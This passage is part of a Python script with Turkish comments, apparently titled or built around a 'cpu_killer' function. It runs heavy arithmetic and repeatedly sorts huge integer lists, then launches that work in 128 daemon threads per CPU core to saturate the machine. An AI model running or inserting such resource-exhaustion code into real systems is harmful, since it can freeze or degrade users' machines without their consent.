        x = 3.14159
        for _ in range(20000000):  # 20.000.000
            x = x ** 1.00001
            x = x / 1.000001
            x = x * 0.999999
            x = x + 0.000001

        # 20 BİN ELEMANLI LİSTE
        arr = [i ** i for i in range(20000)]
        for _ in range(1000):
            arr.sort()
            arr.reverse()

        # 20 BİN DÖNGÜ
        for _ in range(20000):
            a = 1.1
            b = 2.2
            c = a ** b
            d = b ** a
            e = c / d
            f = d / c

# ==========================================
# 4. TÜM ÇEKİRDEKLERİ ZORLA
# ==========================================
core_count = multiprocessing.cpu_count()
thread_count = core_count * 128

print(f"[!] CPU {core_count} çekirdek, {thread_count} thread ile zorlanıyor...")
print(f"[!] Her thread 20 milyon işlem yapacak...")

for _ in range(thread_count):
    threading.Thread(target=cpu_killer, daemon=True).start()

